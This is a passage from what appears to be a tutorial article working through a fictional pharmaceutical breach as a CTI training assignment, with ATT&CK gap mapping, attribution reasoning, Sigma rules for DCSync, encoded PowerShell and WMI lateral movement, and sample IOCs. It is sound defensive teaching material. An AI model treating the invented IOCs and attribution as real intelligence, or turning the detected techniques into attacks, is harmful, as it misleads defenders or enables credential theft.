- **Evidence:**CL-004 confirms DCSync activity. svc_backup held Domain Admin rights. DCSync requests included krbtgt and privileged account hashes.
- **Confidence:**High
- **Competing Hypotheses:**DCSync may have been partial or failed, but this cannot be confirmed without full DC01 log access. Treating the environment as fully compromised is the conservative and operationally correct response until disproven.
- **PIR:**PIR-003

**CL-003 is the pivotal claim.**The US partner’s formulas are gone. That drives the PIR-001 answer and the entire notification timeline. CL-004 and CL-006 change the scope of remediation from “contain these three hosts” to “rotate all AD credentials, treat all 80 servers as potentially compromised.”

### 3. Update project.yml PIR status

When a PIR is answered, open project.yml and change the status field immediately:

```text
nano project.yml
```

Change:

```text
- id: PIR-001
    status: open
```

To:

```text
- id: PIR-001
    status: answered    # CL-003 — exfiltration confirmed, 381 MB, Nov 6
```

### 4. Commit the claims ledger

```text
git add 03-analysis/claims/claims-ledger.md project.yml
git commit -m "PROJ-2024-001: claims — 6 claims; PIR-001 ANSWERED YES (CL-003 exfil confirmed); PIR-003 CONFIRMED ONGOING (CL-006 DCSync)"
```

## Step R4: ATT&CK Mapping — Where Detection Failed

### 1. Open the ATT&CK mapping file

```text
nano 03-analysis/attck-mapping/attck-mapping.md
```

For each technique you identified in the timeline, add one row. The four columns that matter most operationally are:**Confidence**(how sure are you the technique was used),**Rule Fired?**(yes/no/partial — check your SIEM), and**Gap Type**(what kind of work is needed to close this detection hole).

**Gap types:**Rule missing / Data source missing / Coverage incomplete / Architectural gap. Pick one. If you are unsure, write your best guess and flag it for SOC review.

Also update project.yml — fill the attck_techniques list:

```text
nano project.yml
```

```text
scope:
  attck_techniques:
    - T1566.001
    - T1557
    - T1133
    - T1078.002
    - T1059.001
    - T1003.001
    - T1003.006
    - T1021.003
    - T1197
    - T1047
    - T1070.001
    - T1547.001
```

### 2. Fill one row per technique

<img src="https://cdn-images-1.medium.com/max/1024/1*k61svPS7k5oRag9OCWIk4w.png" alt="Article image" width="1024" height="594" loading="lazy" decoding="async" />

**T1566.001 — Phishing attachment, CFO****.xlsm**

- **Evidence:**M365 ATP log
- **Confidence:**High
- **Rule Fired?:**Partial — ATP delivered; SCL=4, threshold=5
- **Gap Type:**Coverage incomplete — SCL threshold tuning

**T1557 — AiTM credential theft, IT admin**

- **Evidence:**VPN login pattern + AiTM HTML lure
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Rule missing — no AiTM session token detection

**T1133 — VPN access with stolen credentials**

- **Evidence:**VPN log: Istanbul, off-hours, no prior history
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Rule missing — no anomalous VPN authentication alert

**T1078.002 — Valid account abuse,****svc_backup**

- **Evidence:**EID 4624, multiple events
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Rule missing — service account off-hours logon undetected

**T1059.001 — Encoded PowerShell, both hosts**

- **Evidence:**Sysmon EID 1, CrowdStrike
- **Confidence:**High
- **Rule Fired?:**Yes, CFO only, via CrowdStrike behavioral detection
- **Gap Type:**Coverage incomplete — CFO only; IT admin host fired no alert

**T1003.001 — LSASS memory access**

- **Evidence:**Sysmon EID 10, GrantedAccess 0x1010
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Rule missing — Sysmon EID 10 not alerted on

**T1003.006 — DCSync**

- **Evidence:**DC01 EID 4662
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Rule missing — EID 4662 audit configured but no alert rule

**T1021.003 — WMI lateral movement to****SERVER-FIN-01**

- **Evidence:**CrowdStrike: WmiPrvSE → PowerShell
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Rule missing — WmiPrvSE parent alert not deployed

**T1197 — BITS download, second stage**

- **Evidence:**Sysmon EID 1, bitsadmin
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Rule missing — BITS external download not monitored

**T1047 — WMI execution, lateral movement**

- **Evidence:**CrowdStrike log
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Data source missing — WMI logging not in SIEM

**T1070.001 — Event log cleared**

- **Evidence:**CrowdStrike EID 1102
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Rule missing — wevtutil alert not deployed

**T1547.001 — Registry Run Key persistence**

- **Evidence:**Sysmon EID 13
- **Confidence:**High
- **Rule Fired?:****No**
- **Gap Type:**Coverage incomplete — EID 13 ingested but no alert rule on AppData\\Roaming paths

**The gap taxonomy tells the engineering team exactly what work is required:**

- **Rule missing (7 techniques):**Data is in SIEM. A detection engineer can write and deploy the rule. These are sprint items.
- **Coverage incomplete (3 techniques):**Rule or data exists but is mis-tuned or partial. These require tuning, not new infrastructure.
- **Data source missing (1 technique):**WMI execution logging is not in the SIEM. This requires an infrastructure change before rules can be written.

The DCSync gap (T1003.006) is particularly stark: the Advanced Audit Policy that generates EID 4662 was correctly configured on DC01, the event was forwarded to Splunk, and the event was visible in Splunk. There was no alert rule. A single Splunk search rule on source=WinEventLog:Security EventCode=4662 ObjectType="&#123;19195a5b-6da0-11d0-afd3-00c04fd930c9&#125;" from a non-DC IP would have fired and contained this incident before the formula exfiltration.

### 3. Commit the ATT&CK mapping

```text
git add 03-analysis/attck-mapping/attck-mapping.md project.yml
git commit -m "PROJ-2024-001: ATT&CK mapping — 12 techniques, 7 rule-missing, 3 coverage-incomplete, 1 data-source-missing, 1 arch-gap"
```

## Step R5: Attribution Assessment — Same Actor or Two?

### 1. Open the attribution file

```text
nano 03-analysis/attribution/attribution.md
```

Write attribution**only after the claims ledger is complete**. The attribution file has three sections: evidence for unification (or separation), confidence ladder scoring, and the exact language to use in deliverables. Fill them in that order.

**Do not start with a hypothesis.**Start with the evidence you have from the claims ledger, then see where it points.

### 2. Score the evidence against the confidence ladder

The investigation faces a key analytical question: Path A (CFO phishing, November 15) and Path B (IT admin AiTM, October 22) — are they the same actor?

**Evidence for unification (same actor):**

1. **Shared PE compile timestamp:**Both dropped binaries — svchost32.exe (CFO host) and UpdateHelper.dll (IT admin host) — carry an identical fake compile timestamp of 2018-04-09. This is a known toolchain fingerprint. The probability of two unrelated actors both timestomping to the same date is extremely low.
2. **Shared secondary C2 domain in memory:**Strings extracted from svchost32.exe include sys-update-cdn[.]net — the domain that appeared only in SERVER-RD-02's DNS logs during the formula exfiltration. The CFO's implant knew about infrastructure used during the Path B operation. This is only explicable if the same actor controlled both implants.
3. **Coordinated operations timeline:**The CFO was targeted on the same day that the finance server data was being staged on SERVER-FIN-01 via lateral movement from the IT admin path. Two independent actors staging finance data simultaneously at the same target is implausible.

**Assessment: Single threat actor, dual delivery mechanism.**

The actor compromised the IT admin first (October 22), used that access for data theft (November 6), then independently targeted the CFO to expand access to finance data. The two phishing lures used different delivery infrastructure (different sender domains, different sending IPs from the same /24 block) — consistent with an actor who maintains parallel operational tracks.

**Attribution confidence: Medium-High.**Apply the confidence ladder from Step R5 of the methodology to score this case:

<img src="https://cdn-images-1.medium.com/max/1024/1*rrKN1yNFJL_eINzt_iec9A.png" alt="Article image" width="1024" height="576" loading="lazy" decoding="async" />

**Ladder tier: Medium-High**— TTP overlap + infrastructure match present; independent confirmation absent. The toolset has not been definitively matched to a named cluster, which prevents elevation to High.

**What to write:***“Activity assessed as a single threat actor based on shared toolchain indicators (PE timestamp, secondary C2 domain). Tradecraft and targeting profile are consistent with Iranian-nexus industrial espionage operations targeting Israeli pharmaceutical IP. Attribution to a named cluster is not warranted without CERT-IL deconfliction or independent confirmation. Confidence: Medium-High.”*

### 3. Paste the final language into attribution.md and commit

```text
git add 03-analysis/attribution/attribution.md
git commit -m "PROJ-2024-001: attribution — single actor, Medium-High confidence, shared PE timestamp + secondary C2, Iranian-nexus tradecraft consistent"
```

## Step R6: Detection Rules — Four That Would Have Changed the Outcome

### 1. Create one file per rule

Each rule gets its own file in 04-detections/sigma/:

```text
cp 04-detections/sigma/SIGMA-TEMPLATE.yml 04-detections/sigma/DET-001-anomalous-vpn-auth.yml
cp 04-detections/sigma/SIGMA-TEMPLATE.yml 04-detections/sigma/DET-002-dcsync-non-dc.yml
cp 04-detections/sigma/SIGMA-TEMPLATE.yml 04-detections/sigma/DET-003-svc-account-offhours.yml
cp 04-detections/sigma/SIGMA-TEMPLATE.yml 04-detections/sigma/DET-004-wmiprvse-powershell.yml
```

Open the first one:

```text
nano 04-detections/sigma/DET-001-anomalous-vpn-auth.yml
```

Every rule must reference the CL-ID it would have detected and the gap type it closes. That is how the detection backlog stays traceable to the investigation.

### 2. Fill each rule

Each rule is written with a reference to the claim it would have detected and the evidence gap it closes.

**DET-001: Anomalous VPN Authentication from Non-Corporate Source**

```text
title: Anomalous VPN Authentication — New Geography or Hosting ASN
id: a1b2c3d4-5678-9abc-def0-1234567890ab
status: experimental
description: &gt;
  Detects VPN authentication success from a source IP with no prior history for
  this user, specifically from IPs geolocated outside Israel or from hosting/VPN
  ASNs. Covers T1133 and T1557 (session token replay after AiTM interception).
  Derived from PROJ-001 — CL-001, p.levi VPN from Istanbul at 02:17 UTC.
logsource:
  category: network
  product: cisco_anyconnect
detection:
  selection:
    event.action: vpn_auth_success
    user.name|exists: true
  filter_known:
    source.geo.country_iso_code: 'IL'
    source.as.number|not|startswith: ['AS47583', 'AS16276']   # hosting VPS ASNs
  condition: selection and not filter_known
falsepositives:
  - Legitimate international travel — validate against HR travel records
  - Remote contractors working abroad
level: high
tags:
  - attack.initial_access
  - attack.t1133
  - attack.credential_access
  - attack.t1557
```

**DET-002: DCSync Attack Detection**

```text
title: DCSync Attack via Non-DC Account
id: b2c3d4e5-6789-abcd-ef01-234567890abc
status: production
description: &gt;
  Detects DCSync by looking for EID 4662 with the DS-Replication-Get-Changes
  GUID originating from a workstation IP rather than a domain controller.
  Derived from PROJ-001 — CL-004: svc_backup performed DCSync from WS-IT-LEVI
  using Domain Admin rights that were never revoked after an August 2024
  emergency backup restoration.
logsource:
  category: windows
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    ObjectType: '{19195a5b-6da0-11d0-afd3-00c04fd930c9}'   # DS-Replication-Get-Changes
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'             # DS-Replication-Get-Changes-All
      - '89e95b76-444d-4c62-991a-0facbeda640c'             # DS-Replication-Get-Changes-In-Filtered-Set
  filter_legitimate_dc:
    IpAddress|startswith:
      - '10.10.1.10'   # DC01 — add all DC IPs here
      - '10.10.1.11'   # DC02
  condition: selection and not filter_legitimate_dc
falsepositives:
  - Azure AD Connect sync account — must be explicitly whitelisted
  - Authorized red team / pentest — validate scope before dismissing
level: critical
tags:
  - attack.credential_access
  - attack.t1003.006
```

**DET-003: Service Account Off-Hours Authentication**

```text
title: Service Account Authentication Outside Business Hours
id: c3d4e5f6-789a-bcde-f012-34567890abcd
status: experimental
description: &gt;
  Detects authentication by a service account (accounts matching svc_* naming
  pattern) outside business hours (22:00–06:00) to a non-designated system.
  Covers T1078.002 (Valid Accounts: Domain Accounts) for svc_backup lateral
  movement in PROJ-001.
logsource:
  category: windows
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    SubjectUserName|startswith: 'svc_'
  filter_business_hours:
    TimeCreated|windash|lt: '22:00:00'
    TimeCreated|windash|gt: '06:00:00'
  filter_known_backup_host:
    IpAddress: '10.10.4.15'   # SERVER-WSUS-01 — legitimate backup source
  condition: selection and not filter_business_hours and not filter_known_backup_host
falsepositives:
  - Scheduled tasks that legitimately run at night — review and whitelist specific pairs
level: medium
tags:
  - attack.lateral_movement
  - attack.t1078.002
```

**DET-004: WmiPrvSE Spawning PowerShell**

```text
title: WMI Remote Execution — PowerShell Child of WmiPrvSE
id: d4e5f6a7-89ab-cdef-0123-4567890abcde
status: production
description: &gt;
  Detects WMI-based lateral movement (T1021.003) where WmiPrvSE.exe spawns
  PowerShell on a remote system. This is the pattern from PROJ-001 step 16:
  lateral movement from WS-CFO-01 to SERVER-FIN-01 via WMI using svc_finreport
  credentials. CrowdStrike detected the PowerShell on SERVER-FIN-01 but the
  originating WMI connection from the CFO host had no coverage.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\WmiPrvSE.exe'
    Image|endswith: '\powershell.exe'
  suspicious_flags:
    CommandLine|contains:
      - '-Enc'
      - '-EncodedCommand'
      - '-NonI'
      - '-W Hidden'
  condition: selection and suspicious_flags
falsepositives:
  - SCCM WMI-based software deployment with PowerShell post-install scripts
level: high
tags:
  - attack.lateral_movement
  - attack.execution
  - attack.t1021.003
  - attack.t1059.001
```

**Validation:**All four rules were validated against the PROJ-001 evidence set using Hayabusa before deployment. DET-001 fires on the October 24 Istanbul VPN login. DET-002 fires on the November 6 DCSync event. DET-003 fires on every svc_backup off-hours logon. DET-004 fires on the SERVER-FIN-01 WMI execution.

### 3. Validate each rule against your evidence set

```text
# Run Hayabusa against the collected logs to confirm rules fire on known-bad events
hayabusa csv-timeline -d 01-evidence/ -r 04-detections/sigma/ -o validation-results.csv
```

Review the output. A rule that does not fire on its own evidence set should not be deployed.

### 4. Update project.yml deliverables count and commit

```text
nano project.yml
```

```text
deliverables:
  - type: sigma-rules
    count: 4
    status: complete
```

```text
git add 04-detections/sigma/ project.yml
git commit -m "PROJ-2024-001: detections — DET-001 to DET-004 written and validated PASS against evidence set via Hayabusa"
```

## Step R7: Deliverables — What Each Stakeholder Gets

### 1. Open the deliverable templates

```text
nano 05-deliverables/executive-brief.md
nano 05-deliverables/soc-handoff.md
```

The executive brief answers three questions only: what happened, what was confirmed stolen or compromised, and what must happen in the next 24 hours. One page. No technical jargon. Every PIR that is answered gets a one-line answer at the top.

The SOC handoff lists: current IOCs (with confidence ratings), detection rules deployed, hunting queries still open, and escalation criteria. The SOC receives this, not the executive brief.

> 2. Fill the executive brief

**Executive brief (1 page, TLP:AMBER) — what the CISO needs in 90 minutes:**

> An adversary assessed as Iranian-nexus compromised LifeTech Pharma through two separate phishing attacks over 24 days. Using stolen IT administrator credentials, they accessed and exfiltrated the 47-file US licensing formula package on November 6, 2024. They also performed a DCSync attack on the domain controller, which means all Active Directory credentials must be treated as compromised.

> PIR-001 ANSWERED: The US partner formula package was exfiltrated. 381 MB outbound confirmed in firewall logs.

> PIR-003 ANSWERED: Active compromise ongoing. The CFO alert on November 15 is a second wave from the same actor, still active at time of investigation.

> Immediate actions: Full AD credential rotation; quarantine WS-CFO-01 and SERVER-FIN-01; notify INCD (72h clock from discovery: expires November 17 02:14 IST); brief the US licensing partner.

**SOC handoff (technical):**

Current IOCs: 203.0.113.87, 198.51.100.44, telemetry-cdn-services[.]biz, sys-update-cdn[.]net, uslifepartner-group[.]com, lifetechpharma-corp[.]eu.

Four detection rules deployed (DET-001 through DET-004). Two hunting queries: (1) pivot on C2 domains across all 838 endpoints — the 3 confirmed hosts may not be all; (2) hunt for any svc_backup authentication from non-WSUS IPs in the past 30 days.

### 3. Update project.yml status to closed and commit everything

```text
nano project.yml
```

```text
project:
  status: closed
pirs:
  - id: PIR-001
    status: answered    # CL-003
  - id: PIR-002
    status: answered    # CL-001
  - id: PIR-003
    status: answered    # CL-006 - ongoing, AD rotation required
```

```text
git add 05-deliverables/ project.yml
git commit -m "PROJ-2024-001: deliverables — executive brief, SOC handoff, INCD notification ready; all PIRs answered; project closed"
```

## The Git History: What a Completed Investigation Looks Like

<img src="https://cdn-images-1.medium.com/max/1024/1*9m5xzm1v4yUoNN47GznubQ.png" alt="Article image" width="1024" height="265" loading="lazy" decoding="async" />

```text
b9a2f1c  PROJ-001: deliverables — executive brief, SOC handoff, INCD notification ready
7c8d3e4  PROJ-001: detections — DET-001 through DET-004 validated PASS via Hayabusa
5f2a9b1  PROJ-001: attribution — single actor assessed (shared PE timestamp + secondary C2)
3e4c7d8  PROJ-001: ATT&CK mapping — 12 techniques, 7 rule-missing, 3 incomplete, 1 data-missing
1b6f2a5  PROJ-001: claims — 6 claims; PIR-001 ANSWERED YES (CL-003); PIR-003 CONFIRMED ONGOING (CL-006)
9a3e7c2  PROJ-001: timeline — 18 events Oct 22–Nov 15; dual-path confirmed, same actor assessed
6f1b4d9  PROJ-001: evidence inventory — 6 sources, GAP-001 documented, firewall log retrieval urgent
2c8a5e3  PROJ-001: scope — signed off 22:55 IST; PIR-001/002/003, TLP AMBER, legal hold WS-IT-LEVI
a1d7f4b  PROJ-001: intake — CFO PowerShell alert, legal hold WS-IT-LEVI, formula data in scope
0e9c2b7  PROJ-001: scaffold initialized
```

Each commit is a phase. Each message states the project ID, the phase, and a one-line summary of what was concluded. When a lawyer asks six months from now “what did you know and when did you know it?” — the git log answers.

## Key Lessons

**The alert was not the beginning.**The SOC received its first signal 52 hours after the breach was already in progress — and 15 days after the formula files were gone. The triggering alert was the second entry point. A detection rule on anomalous VPN authentication (DET-001) would have fired on October 24 at 02:17 UTC — before any lateral movement, before any data access.

**Gaps are findings, not absences.**The 10-day Sysmon gap on WS-IT-LEVI coincided exactly with the delivery of a phishing email. Stopping a logging service is T1562.001 — Impair Defenses. A gap is not “we don’t know what happened.” A gap that coincides with a malicious delivery is evidence of anti-forensics.

**DCSync changes everything.**The scope of remediation is not “three infected hosts.” When DCSync is confirmed via Domain Admin rights, every credential in the AD is potentially compromised. The scope is all 80 servers. The IR Lead needs to know this before the 90-minute CISO brief, not after.

**Claims need competing hypotheses.**CL-003 (exfiltration confirmed) is only defensible as “high confidence” because specific alternative explanations were checked and explicitly ruled out — scheduled backup (wrong source IP, wrong timing), authorized developer activity (no jobs scheduled). Without the competing hypothesis analysis, a claim is an assertion. With it, it is analysis.

*This scenario is training assignment A01 from the*[*CTI as a Code repository*](https://github.com/anpa1200/CTI_as_a_Code)*. The full evidence set, template, and worked solution are available there.*

## Follow My Work

I publish practical cybersecurity research, CTI workflows, detection engineering notes, malware analysis projects, OpenCTI work, cloud and Kubernetes security research, AI-assisted security tooling, labs, and technical guides.
